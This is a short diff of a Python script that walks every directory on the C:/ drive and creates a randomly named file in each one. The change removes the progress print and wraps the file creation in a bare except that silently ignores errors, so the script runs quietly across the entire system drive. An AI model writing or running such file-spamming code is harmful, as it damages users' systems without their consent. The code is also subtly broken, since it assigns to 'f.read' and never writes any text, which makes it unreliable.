@@ -26,11 +26,13 @@ def makeText():
     return text
 
 for (path, dir,file) in os.walk('C:/',topdown=False):
-    print(path)
-    if path == 'C:/':
-        filename = path + makeName()+"."+makeName()
-    else:
-        filename = path + "/"+ makeName()+"."+makeName()
-    f = open(filename,'w')
-    f.read = makeText()
-    f.close()
+    try:
+        if path == 'C:/':
+            filename = path + makeName()+"."+makeName()
+        else:
+            filename = path + "/"+ makeName()+"."+makeName()
+        f = open(filename,'w')
+        f.read = makeText()
+        f.close()
+    except:
+        pass
